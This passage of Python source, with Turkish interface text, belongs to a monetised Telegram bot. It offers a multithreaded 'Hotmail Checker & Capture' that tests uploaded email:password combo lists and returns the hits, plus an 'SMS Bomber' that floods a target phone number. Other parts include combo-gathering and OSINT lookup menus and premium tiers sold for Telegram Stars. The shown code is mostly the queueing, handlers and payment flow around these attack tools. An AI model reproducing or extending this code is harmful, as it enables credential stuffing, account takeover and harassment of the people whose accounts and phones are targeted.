            elif status == "bad": HOTMAIL_BAD += 1
            else: HOTMAIL_ERROR += 1
    except:
        with HOTMAIL_LOCK: HOTMAIL_ERROR += 1; HOTMAIL_PROCESSED += 1

def process_hotmail_queue():
    global HOTMAIL_CURRENT_TASK, HOTMAIL_QUEUE_RUNNING, main_bot
    global HOTMAIL_HIT, HOTMAIL_BAD, HOTMAIL_ERROR, HOTMAIL_2FA, HOTMAIL_REWARDS
    global HOTMAIL_KEYWORD_HITS, HOTMAIL_COUNTRY_HITS, HOTMAIL_START_TIME
    while HOTMAIL_QUEUE_RUNNING:
        try:
            try: task = HOTMAIL_QUEUE.get(timeout=5)
            except queue.Empty: continue
            HOTMAIL_START_TIME = time.time()
            HOTMAIL_HIT = 0; HOTMAIL_BAD = 0; HOTMAIL_ERROR = 0; HOTMAIL_2FA = 0
            HOTMAIL_KEYWORD_HITS = {}; HOTMAIL_COUNTRY_HITS = {}
            with HOTMAIL_QUEUE_LOCK:
                HOTMAIL_CURRENT_TASK = {"user_id":task.user_id,"user_name":task.user_name,
                                        "combo_list":task.combo_list,"is_premium":task.is_premium,
                                        "chat_id":task.chat_id,"status_msg_id":task.status_msg_id,
                                        "keywords":task.keywords}
            try:
                if main_bot:
                    main_bot.edit_message_text(
                        f"🚀 <b>Hotmail Checker Başladı!</b>\n"
                        f"👤 {esc(task.user_name)}\n"
                        f"📂 Toplam: {len(task.combo_list)} satır\n"
                        f"⚙️ Thread: {task.thread_count}\n"
                        f"📌 İlerleme: 0/{len(task.combo_list)}",
                        task.chat_id, task.status_msg_id, parse_mode="HTML")
            except: pass
            try:
                with ThreadPoolExecutor(max_workers=task.thread_count) as executor:
                    futures = []
                    for line in task.combo_list:
                        futures.append(executor.submit(hotmail_worker, line, task.user_id, task.user_name, task.is_premium, task.keywords))
                    processed = 0; total = len(task.combo_list)
                    for future in as_completed(futures):
                        processed += 1
                        try: future.result()
                        except: pass
                        if processed % 10 == 0 or processed == total:
                            try:
                                if main_bot:
                                    main_bot.edit_message_text(
                                        f"🚀 <b>Hotmail Checker Çalışıyor</b>\n"
                                        f"👤 {esc(task.user_name)}\n"
                                        f"📂 İlerleme: {processed}/{total}\n"
                                        f"✅ Hit: {HOTMAIL_HIT} | ❌ Bad: {HOTMAIL_BAD}\n"
                                        f"🔐 2FA: {HOTMAIL_2FA} | ⚠️ Error: {HOTMAIL_ERROR}",
                                        task.chat_id, task.status_msg_id, parse_mode="HTML")
                            except: pass
            except: pass
            elapsed = int(time.time() - HOTMAIL_START_TIME)
            total = HOTMAIL_HIT + HOTMAIL_BAD + HOTMAIL_ERROR + HOTMAIL_2FA
            result_lines = [
                "✅ <b>Tarama Tamamlandı!</b>", "━━━━━━━━━━━━━━━━━━━━━",
                f"📊 Toplam: {total}", "",
                f"✅ HIT: {HOTMAIL_HIT}",
                f"🎁 Rewards: {HOTMAIL_REWARDS}",
                f"🔐 2FA: {HOTMAIL_2FA}",
                f"❌ BAD: {HOTMAIL_BAD}",
                f"⚠️ ERROR: {HOTMAIL_ERROR}", "",
                f"⏰ Süre: {elapsed} sn", "",
                "🏷️ <b>KEYWORDS:</b>"]
            for kw, count in HOTMAIL_KEYWORD_HITS.items():
                result_lines.append(f"🎯 {kw}: {count} Hit")
            if not HOTMAIL_KEYWORD_HITS: result_lines.append("   ❌ Eşleşme yok")
            result_text = "\n".join(result_lines)
            try:
                if main_bot:
                    main_bot.edit_message_text(result_text, task.chat_id, task.status_msg_id, parse_mode="HTML")
                    hit_file = f"hits_{task.user_id}.txt"
                    if os.path.exists(hit_file) and os.path.getsize(hit_file) > 0:
                        with open(hit_file, "rb") as f:
                            main_bot.send_document(task.chat_id, f, caption=f"✅ {HOTMAIL_HIT}x Hotmail Hit")
                        os.remove(hit_file)
            except: pass
            with HOTMAIL_QUEUE_LOCK: HOTMAIL_CURRENT_TASK = None
        except Exception as e:
            print(f"[QUEUE ERROR] {e}")
            with HOTMAIL_QUEUE_LOCK: HOTMAIL_CURRENT_TASK = None

def start_queue_processor():
    global HOTMAIL_QUEUE_RUNNING, HOTMAIL_QUEUE_THREAD
    if HOTMAIL_QUEUE_RUNNING: return
    HOTMAIL_QUEUE_RUNNING = True
    HOTMAIL_QUEUE_THREAD = threading.Thread(target=process_hotmail_queue, daemon=True)
    HOTMAIL_QUEUE_THREAD.start()

def add_to_queue(task):
    with HOTMAIL_QUEUE_LOCK:
        position = HOTMAIL_QUEUE.qsize() + 1
        if HOTMAIL_CURRENT_TASK: position += 1
        task.queue_position = position
        HOTMAIL_QUEUE.put(task)
        try:
            if main_bot:
                is_prem = task.is_premium
                limit_text = f"{PREMIUM_CHECK_LIMIT}" if is_prem else f"{FREE_CHECK_LIMIT}"
                main_bot.send_message(task.chat_id,
                    f"🚀 <b>Hotmail taraması sıraya alınıyor...</b>\n"
                    f"⏳ <b>Sıra Numaranız:</b> {position}\n"
                    f"📊 <b>Limit:</b> {limit_text} satır",
                    parse_mode="HTML")
        except: pass

def _process_hotmail_file(msg, bot_instance):
    uid = msg.from_user.id
    if not msg.document:
        bot_instance.reply_to(msg, "❌ Lütfen geçerli bir dosya gönderin!", parse_mode="HTML")
        return
    try:
        file_info = bot_instance.get_file(msg.document.file_id)
        downloaded = bot_instance.download_file(file_info.file_path)
        combo_text = downloaded.decode("utf-8", errors="ignore")
        combo_list = [line.strip() for line in combo_text.splitlines() if line.strip() and ":" in line.strip()]
        if not combo_list:
            bot_instance.reply_to(msg, "❌ Geçerli combo bulunamadı!", parse_mode="HTML")
            return
        is_prem = is_premium(uid)
        max_lines = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
        if len(combo_list) > max_lines:
            bot_instance.reply_to(msg, f"⚠️ Dosya çok büyük! Limit: {max_lines} satır", parse_mode="HTML")
            return
        m = bot_instance.reply_to(msg, f"✅ <b>{len(combo_list)}</b> satır bulundu.\n⚙️ Thread sayısını girin (10-100):", parse_mode="HTML")
        bot_instance.register_next_step_handler(m, lambda m: _start_hotmail_scan_queue(m, combo_list, bot_instance))
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ Dosya okunamadı: {esc(e)}", parse_mode="HTML")

def _start_hotmail_scan_queue(msg, combo_list, bot_instance):
    uid = msg.from_user.id
    global HOTMAIL_THREADS
    try:
        thread_count = int(msg.text.strip())
        if thread_count < 1: thread_count = 10
        elif thread_count > 100: thread_count = 100
    except: thread_count = 10
    HOTMAIL_THREADS = thread_count
    is_prem = is_premium(uid)
    user_name = get_user_name(uid)
    keywords = get_user_keywords(uid)
    start_queue_processor()
    status_msg = bot_instance.reply_to(msg,
        f"⏳ <b>Dosyanız sıraya alınıyor...</b>\n"
        f"👤 {esc(user_name)}\n📂 {len(combo_list)} satır\n"
        f"⚙️ Thread: {thread_count}", parse_mode="HTML")
    task = HotmailTask(user_id=uid, user_name=user_name, combo_list=combo_list,
                       thread_count=thread_count, status_msg_id=status_msg.message_id,
                       chat_id=msg.chat.id, is_premium=is_prem, keywords=keywords)
    add_to_queue(task)

def get_queue_status_text(user_id=None):
    with HOTMAIL_QUEUE_LOCK:
        lines = ["⏳ <b>BEKLEYEN SIRALAR</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        if HOTMAIL_CURRENT_TASK:
            task = HOTMAIL_CURRENT_TASK
            lines.append(f"  🔄 {esc(task.get('user_name'))} | İşleniyor ({len(task.get('combo_list', []))} satır)")
        else: lines.append("  ⏸️ İşlem yok")
        queue_list = list(HOTMAIL_QUEUE.queue)
        if queue_list:
            for i, task in enumerate(queue_list, 1):
                lines.append(f"  {i}. {esc(task.user_name)} | Sırada ({len(task.combo_list)} satır)")
        else: lines.append("  📭 Bekleyen yok")
        lines.append("👨‍💻 @hackledin")
        return "\n".join(lines)

# ══════════════════════════════════════════════════════════════
#  HANDLERS
# ══════════════════════════════════════════════════════════════
main_bot = None

def register_handlers(bot_instance):
    global main_bot
    main_bot = bot_instance

    @bot_instance.message_handler(commands=["start"])
    def cmd_start(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 <b>YASAKLANDINIZ!</b>\nSebep: {esc(get_ban_reason(uid))}", parse_mode="HTML")
            return
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        mk = InlineKeyboardMarkup(row_width=3)
        mk.add(_btn("🇹🇷 Türkçe", "lang_tr"), _btn("🇬🇧 English", "lang_en"), _btn("🇸🇦 العربية", "lang_ar"))
        bot_instance.reply_to(msg, s(uid, "lang_pick"), reply_markup=mk)

    @bot_instance.message_handler(commands=["premium"])
    def cmd_premium(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML")
            return
        if is_premium(uid):
            bot_instance.reply_to(msg, s(uid, "already_premium"), parse_mode="HTML")
            return
        txt = (f"{s(uid, 'premium_title')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━\n"
               f"{s(uid, 'premium_price_txt', price=PREMIUM_PRICE)}\n"
               f"{s(uid, 'premium_dur')}\n"
               f"{s(uid, 'premium_features')}")
        bot_instance.reply_to(msg, txt, reply_markup=premium_kb(uid), parse_mode="HTML")

    @bot_instance.message_handler(commands=["hotmail"])
    def cmd_hotmail(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML")
            return
        user_name = esc(get_user_name(uid))
        keywords = get_user_keywords(uid)
        limit_text = get_keyword_limit_text(uid)
        is_prem = is_premium(uid)
        capture_left = get_capture_limit_text(uid)
        bot_instance.reply_to(msg,
            f"📧 <b>HOTMAIL CHECKER & CAPTURE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Kullanıcı: {user_name}\n"
            f"🔖 Keyword: {esc(', '.join(keywords))}\n"
            f"📊 Keyword Limit: {limit_text}\n"
            f"📧 Hotmail: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({FREE_CHECK_LIMIT} satır)'}\n"
            f"📸 Capture: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({capture_left} kaldı)'}\n"
            f"📌 Aşağıdaki menüden işlem yapın:",
            reply_markup=hotmail_keyboard(uid), parse_mode="HTML")

    @bot_instance.message_handler(commands=["queue", "sıra"])
    def cmd_queue_status(msg):
        bot_instance.reply_to(msg, get_queue_status_text(msg.from_user.id), parse_mode="HTML")

    @bot_instance.message_handler(commands=["profil"])
    def cmd_profile(msg):
        _show_profile(msg.chat.id, msg.from_user.id, bot_instance)

    @bot_instance.message_handler(commands=["istatistik"])
    def cmd_stats_detailed(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML")
            return
        tu, prem_pu, osint_pu, tc, tch = get_bot_stats()
        bot_instance.reply_to(msg,
            f"📊 <b>SİSTEM İSTATİSTİKLERİ</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Toplam Kullanıcı: {tu}\n"
            f"📧 Hotmail Premium: {prem_pu or 0}\n"
            f"🌍 OSINT Premium: {osint_pu or 0}\n"
            f"📦 Toplam Combo: {tc or 0}\n"
            f"🔍 Toplam Sorgu: {tch or 0}\n"
            f"👨‍💻 @hackledin", parse_mode="HTML")

    @bot_instance.message_handler(commands=["tgid", "telegramid", "tgsorgu"])
    def cmd_tgid(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML")
            return
        free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
        balance = tgid_get_balance(uid)
        if uid == ADMIN_ID: durum = "👑 Admin — Sınırsız"
        elif is_premium(uid): durum = "⭐ Premium — Sınırsız"
        else: durum = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}  |  💰 Bakiye: {balance}"
        txt = (f"🆔 <b>TELEGRAM ID SORGU</b>\n"
               f"━━━━━━━━━━━━━━━━━━━━━\n"
               f"📊 {durum}\n\n"
               f"🔍 Telegram kullanıcı adını sorgula.\n\n"
               f"<b>Rapor:</b> TXT dosyası olarak gelir.")
        bot_instance.reply_to(msg, txt, reply_markup=tgid_kb(uid), parse_mode="HTML")

    @bot_instance.message_handler(commands=["aiimg", "ai", "resim"])
    def cmd_aiimg(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML")
            return
        free_left = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))
        credits = aiimg_get_credits(uid)
        if uid == ADMIN_ID: durum = "👑 Admin — Sınırsız"
        elif is_premium(uid): durum = "⭐ Premium — Sınırsız"
        else: durum = f"🆓 Free: {free_left}/{AI_IMG_FREE_LIMIT}  |  💎 Hak: {credits}"
        txt = (f"🎨 <b>AI IMAGE GENERATOR</b>\n"
               f"━━━━━━━━━━━━━━━━━━━━━\n"
               f"📊 {durum}\n\n"
               f"📸 Bir fotoğraf gönder → AI onu dönüştürsün!")
        bot_instance.reply_to(msg, txt, reply_markup=aiimg_kb(uid), parse_mode="HTML")

    @bot_instance.message_handler(commands=["exif", "foto", "meta"])
    def cmd_exif(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML")
            return
        bot_instance.reply_to(msg,
            "📸 <b>EXIF Metadata Okuyucu</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Analiz etmek istediğin fotoğrafı gönder.", parse_mode="HTML")

    @bot_instance.message_handler(commands=["sarki", "muzik", "music", "song"])
    def cmd_music(msg):
        _process_music(msg, bot_instance)

    @bot_instance.message_handler(commands=["addbot"])
    def cmd_addbot(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML")
            return
        parts = msg.text.split()
        if len(parts) < 2:
            bot_instance.reply_to(msg, s(uid, "multi_bot_add_usage"), parse_mode="HTML")
            return
        token = parts[1].strip()
        if len(token) < 30:
            bot_instance.reply_to(msg, "❌ Geçersiz token formatı!", parse_mode="HTML")
            return
        if token == BOT_TOKEN:
            bot_instance.reply_to(msg, "❌ Ana botun token'ı eklenemez!", parse_mode="HTML")
            return
        with _PROC_LOCK:
            if token in _CHILD_PROCS and _CHILD_PROCS[token].poll() is None:
                bot_instance.reply_to(msg, s(uid, "multi_bot_exists"), parse_mode="HTML")
                return
            try:
                success = _spawn_bot(token, uid)
                if success:
                    bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=esc(token[:20] + "..."), owner=esc(msg.from_user.first_name or str(uid))), parse_mode="HTML")
                else:
                    bot_instance.reply_to(msg, "❌ Bot başlatılamadı!", parse_mode="HTML")
            except Exception as e:
                bot_instance.reply_to(msg, f"❌ Hata: {esc(e)}", parse_mode="HTML")

    @bot_instance.message_handler(commands=["video"])
    def cmd_video(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML")
            return
        m = bot_instance.reply_to(msg, s(uid, "video_ask"), parse_mode="HTML")
        bot_instance.register_next_step_handler(m, lambda m: _process_video(m, bot_instance))

    @bot_instance.message_handler(commands=["smsbomb", "sms"])
    def cmd_smsbomb(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML")
            return
        with _SMS_LOCK:
            if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
                sess = _SMS_SESSIONS[uid]
                bot_instance.reply_to(msg,
                    f"⚠️ <b>Aktif Bombardıman Var!</b>\n"
                    f"📱 Hedef: <code>{esc(sess['target'])}</code>\n"
                    f"📊 Gönderilen: <b>{sess['count']}</b>", parse_mode="HTML")
                return
        m = bot_instance.reply_to(msg,
            "💣 <b>SMS Bomber</b>\n📱 Hedef numarayı girin (10 haneli):\nÖrnek: <code>5306524123</code>",
            parse_mode="HTML")
        bot_instance.register_next_step_handler(m, lambda m: _sms_step1_number(m, bot_instance))

    @bot_instance.message_handler(commands=["smsstop"])
    def cmd_smsstop(msg):
        uid = msg.from_user.id
        with _SMS_LOCK:
            if uid not in _SMS_SESSIONS or not _SMS_SESSIONS[uid].get("running"):
                bot_instance.reply_to(msg, "❌ Aktif SMS bombardımanı yok.", parse_mode="HTML")
                return
            sess = _SMS_SESSIONS[uid]
            sess["event"].set()
            sess["running"] = False
            bot_instance.reply_to(msg,
                f"🛑 <b>SMS Bomber Durduruldu</b>\n"
                f"📱 Hedef: <code>{esc(sess['target'])}</code>\n"
                f"📊 Toplam: <b>{sess['count']}</b> SMS", parse_mode="HTML")

    @bot_instance.message_handler(commands=["smsstatus"])
    def cmd_smsstatus(msg):
        uid = msg.from_user.id
        with _SMS_LOCK:
            if uid not in _SMS_SESSIONS:
                bot_instance.reply_to(msg, "📊 Hiç SMS bombardımanı başlatılmadı.", parse_mode="HTML")
                return
            sess = dict(_SMS_SESSIONS[uid])
            status = "🟢 Aktif" if sess.get("running") else "🔴 Durdu"
            bot_instance.reply_to(msg,
                f"📊 <b>SMS Bomber Durumu</b>\n"
                f"📱 Hedef: <code>{esc(sess['target'])}</code>\n"
                f"📌 Durum: <b>{status}</b>\n"
                f"📊 Gönderilen: <b>{sess['count']}</b> SMS", parse_mode="HTML")

    @bot_instance.message_handler(commands=["admin"])
    def cmd_admin(msg):
        uid = msg.from_user.id
        if uid != ADMIN_ID:
            bot_instance.reply_to(msg, s(uid, "admin_only"), parse_mode="HTML")
            return
        mk = InlineKeyboardMarkup(row_width=2)
        mk.add(
            _btn("📊 Bot İstatistik", "adm_stats"),
            _btn("⭐ Premium Kullanıcılar", "adm_prem_users"),
            _btn("📋 Premium Log", "adm_prem_log"),
            _btn("⭐ Premium Ver", "adm_give_premium"),
            _btn("➖ Premium Kaldır", "adm_remove"),
            _btn("🚫 Kullanıcı Banla", "adm_ban"),
            _btn("✅ Ban Kaldır", "adm_unban"),
            _btn("📋 Yasaklı Listesi", "adm_banned"),
            _btn("📢 Duyuru Gönder", "adm_announce"),
            _btn("🤖 Botları Listele", "adm_listbots"),
            _btn("📋 Hotmail Log", "adm_hotmail_log"),
            _btn("🆔 TG-ID Bakiye Ver", "adm_tgid_give"),
            _btn("➖ TG-ID Bakiye Al", "adm_tgid_take"),
            _btn("📋 TG-ID Logları", "adm_tgid_logs"),
            _btn("💰 TG-ID Satın Almalar", "adm_tgid_purchases"),
            _btn("🎨 AI Hak Ver", "adm_aiimg_give"),
            _btn("➖ AI Hak Al", "adm_aiimg_take"),
            _btn("📋 AI Logları", "adm_aiimg_logs"),
            _btn("💰 AI Satın Almalar", "adm_aiimg_purchases"),
        )
        bot_instance.reply_to(msg, "👑 <b>ADMIN PANELİ</b>", reply_markup=mk, parse_mode="HTML")

    @bot_instance.message_handler(content_types=["photo", "document"])
    def handle_photo_exif(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML")
            return
        caption = (msg.caption or "").strip().lower()
        aiimg_trigger = any(caption == t or caption.startswith(t + " ") for t in ("/aiimg","aiimg","/ai","/generate","/uret"))
        if aiimg_trigger:
            aiimg_process(msg, bot_instance)
            return
        exif_trigger = any(caption == t or caption.startswith(t + " ") for t in ("/exif","/meta","/foto","exif","meta"))
        if msg.content_type == "document":
            doc = msg.document
            if doc.mime_type not in ("image/jpeg","image/jpg","image/png","image/tiff","image/webp","image/heic"):
                if exif_trigger:
                    bot_instance.reply_to(msg, "❌ Bu dosya bir resim değil!", parse_mode="HTML")
                return
            if caption != "" and not exif_trigger: return
        wait_msg = bot_instance.reply_to(msg, "🔍 Fotoğraf analiz ediliyor...", parse_mode="HTML")
        gecici = f"/tmp/exif_{uid}_{int(time.time())}.jpg"
        try:
            if msg.content_type == "photo":
                file_info = bot_instance.get_file(msg.photo[-1].file_id)
                dosya = bot_instance.download_file(file_info.file_path)
            else:
                file_info = bot_instance.get_file(msg.document.file_id)
                dosya = bot_instance.download_file(file_info.file_path)
            with open(gecici, "wb") as f: f.write(dosya)
            sonuc, hata = _exif_analiz(gecici)
            if hata:
                bot_instance.edit_message_text(hata, wait_msg.chat.id, wait_msg.message_id, parse_mode="HTML")
                return
            mesaj = _exif_mesaj_olustur(sonuc)
            bot_instance.edit_message_text(mesaj, wait_msg.chat.id, wait_msg.message_id,
                                           parse_mode="HTML", disable_web_page_preview=False)
        except Exception as e:
            try:
                bot_instance.edit_message_text(f"❌ Hata: <code>{esc(e)}</code>",
                                               wait_msg.chat.id, wait_msg.message_id, parse_mode="HTML")
            except: pass
        finally:
            try: os.remove(gecici)
            except: pass

    MENU_KEYS = {
        "tr": {"combo": "📦 Combo Çek", "tools": "🛠 Araçlar", "stats": "📊 İstatistik",
               "profile": "👤 Profil", "lb": "🏆 Lider Tablosu", "api": "⚙️ API Değiştir", "help": "❓ Yardım"},
        "en": {"combo": "📦 Combo", "tools": "🛠 Tools", "stats": "📊 Stats",
               "profile": "👤 Profile", "lb": "🏆 Leaderboard", "api": "⚙️ API", "help": "❓ Help"},
        "ar": {"combo": "📦 كومبو", "tools": "🛠 الأدوات", "stats": "📊 الإحصائيات",
               "profile": "👤 الملف الشخصي", "lb": "🏆 المتصدرون", "api": "⚙️ API", "help": "❓ مساعدة"},
    }

    @bot_instance.message_handler(func=lambda m: True, content_types=["text"])
    def handle_text(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, "🚫 <b>YASAKLANDINIZ!</b>", parse_mode="HTML")
            return
        txt = msg.text
        l = lang(uid)
        keys = MENU_KEYS.get(l, MENU_KEYS["tr"])
        if txt == keys.get("combo"):
            m = bot_instance.reply_to(msg, s(uid, "combo_ask"), parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _process_combo(m, bot_instance))
        elif txt == keys.get("tools"):
            bot_instance.reply_to(msg, s(uid, "select_op"), reply_markup=tools_kb(uid), parse_mode="HTML")
        elif txt == keys.get("stats"): _show_stats(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("profile"): _show_profile(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("lb"): _show_leaderboard(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("api"): _show_api_menu(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("help"): _show_help(msg.chat.id, uid, bot_instance)

    @bot_instance.callback_query_handler(func=lambda c: True)
    def handle_cb(call):
        try:
            uid = call.from_user.id
            data = call.data
            if data.startswith("lang_"):
                l = data[5:]
                db_set(uid, "language", l)
                name = esc(call.from_user.first_name or "User")
                status = "⭐ PREMIUM" if is_premium(uid) else "🆓 Ücretsiz"
                try: bot_instance.answer_callback_query(call.id, s(uid, "lang_ok"))
                except: pass
                try: bot_instance.delete_message(call.message.chat.id, call.message.message_id)
                except: pass
                bot_instance.send_message(call.message.chat.id,
                    s(uid, "welcome", name=name, status=status),
                    reply_markup=main_kb(uid), parse_mode="HTML")
                return
            if data == "noop":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "goto_home":
                try: bot_instance.delete_message(call.message.chat.id, call.message.message_id)
                except: pass
                bot_instance.send_message(call.message.chat.id, "🏠", reply_markup=main_kb(uid))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "goto_tools":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text(s(uid, "select_op"), call.message.chat.id,
                                                   call.message.message_id, reply_markup=tools_kb(uid), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id, s(uid, "select_op"),
                                              reply_markup=tools_kb(uid), parse_mode="HTML")
                return
            if data == "menu_turkey":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=turkey_kb(uid))
                except:
                    bot_instance.send_message(call.message.chat.id, "🇹🇷 Türkiye Sorguları", reply_markup=turkey_kb(uid), parse_mode="HTML")
                return
            if data == "menu_ls":
                if not is_premium_osint(uid):
                    mk = InlineKeyboardMarkup()
                    mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
                    mk.add(_btn(s(uid, "back_btn"), "goto_tools"))
                    txt = ("🔒 <b>LeakSights OSINT — Premium</b>\n"
                           "💰 Fiyat: 200 Yıldız\n"
                           "♾️ Süre: Sınırsız (Ömür Boyu)\n"
                           "🔍 30+ OSINT Sorgu")
                    try: bot_instance.answer_callback_query(call.id)
                    except: pass
                    try:
                        bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id, reply_markup=mk, parse_mode="HTML")
                    except:
                        bot_instance.send_message(call.message.chat.id, txt, reply_markup=mk, parse_mode="HTML")
                else:
                    try: bot_instance.answer_callback_query(call.id)
                    except: pass
                    try:
                        bot_instance.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=ls_kb(uid))
                    except:
                        bot_instance.send_message(call.message.chat.id, "🌍 LeakSights OSINT", reply_markup=ls_kb(uid), parse_mode="HTML")
                return
            if data == "buy_premium":
                if is_premium(uid):
                    try: bot_instance.answer_callback_query(call.id, "⭐ Zaten Premium sahibisiniz!", show_alert=True)
                    except: pass
                    return
                prices = [LabeledPrice(label="⭐ Premium Üyelik", amount=PREMIUM_PRICE)]
                bot_instance.send_invoice(call.message.chat.id, title="Premium Üyelik",
                    description="Sınırsız Hotmail + Capture + Keyword + TG-ID + AI",
                    invoice_payload="premium", provider_token="", currency="XTR", prices=prices)
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "buy_osint":
                if is_premium_osint(uid):
                    try: bot_instance.answer_callback_query(call.id, "🌍 Zaten OSINT Premium sahibisiniz!", show_alert=True)
                    except: pass
                    return
                prices = [LabeledPrice(label="🌍 OSINT Premium", amount=OSINT_PRICE)]
                bot_instance.send_invoice(call.message.chat.id, title="OSINT Premium",
                    description="LeakSights OSINT - 30+ Sorgu",
                    invoice_payload="osint", provider_token="", currency="XTR", prices=prices)
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            # 🆔 TG-ID
            if data == "tool_tgid":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
                balance = tgid_get_balance(uid)
                if uid == ADMIN_ID: durum = "👑 Admin — Sınırsız"
                elif is_premium(uid): durum = "⭐ Premium — Sınırsız"
                else: durum = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}  |  💰 Bakiye: {balance}"
                txt = (f"🆔 <b>TELEGRAM ID SORGU</b>\n"
                       f"━━━━━━━━━━━━━━━━━━━━━\n"
                       f"📊 {durum}\n\n"
                       f"🔍 Telegram kullanıcı adını sorgula.")
                try:
                    bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id,
                                                   reply_markup=tgid_kb(uid), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id, txt, reply_markup=tgid_kb(uid), parse_mode="HTML")
                return
            if data == "tgid_search":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id,
                    "🔍 <b>Telegram ID Sorgu</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━\n"
                    "Sorgulamak istediğin kullanıcı adını yaz:\n"
                    "Örnek: <code>@durov</code> veya <code>durov</code>",
                    parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: tgid_process_search(m, bot_instance))
                return
            if data == "tgid_packages":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                txt = (f"💎 <b>BAKİYE PAKETLERİ</b>\n"
                       f"━━━━━━━━━━━━━━━━━━━━━\n"
                       f"• <b>{TGID_PACKAGE_25} Sorgu</b> → {TGID_PRICE_25} ⭐\n"
                       f"• <b>{TGID_PACKAGE_50} Sorgu</b> → {TGID_PRICE_50} ⭐\n"
                       f"• <b>{TGID_PACKAGE_100} Sorgu</b> → {TGID_PRICE_100} ⭐")
                try:
                    bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id,
                                                   reply_markup=tgid_packages_kb(), parse_mode="HTML")
                except:
                    bot_instance.send_message(call.message.chat.id, txt, reply_markup=tgid_packages_kb(), parse_mode="HTML")
                return
            if data == "tgid_my_stats":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                tgid_show_my_stats(call.message.chat.id, uid, bot_instance)
                return
            if data.startswith("tgid_buy_"):
                pkg_num = data.replace("tgid_buy_", "")
                pkg_map = {"25":(TGID_PACKAGE_25,TGID_PRICE_25,"25 Sorgu"),
                           "50":(TGID_PACKAGE_50,TGID_PRICE_50,"50 Sorgu"),
                           "100":(TGID_PACKAGE_100,TGID_PRICE_100,"100 Sorgu")}
                if pkg_num not in pkg_map:
                    try: bot_instance.answer_callback_query(call.id, "❌ Geçersiz paket!", show_alert=True)
                    except: pass
                    return
                qty, stars, label = pkg_map[pkg_num]
                prices = [LabeledPrice(label=label, amount=stars)]
                try:
                    bot_instance.send_invoice(chat_id=call.message.chat.id, title=f"💎 {label}",
                        description=f"{qty} adet Telegram ID sorgu hakkı",
                        invoice_payload=f"tgid_{pkg_num}", provider_token="", currency="XTR", prices=prices)
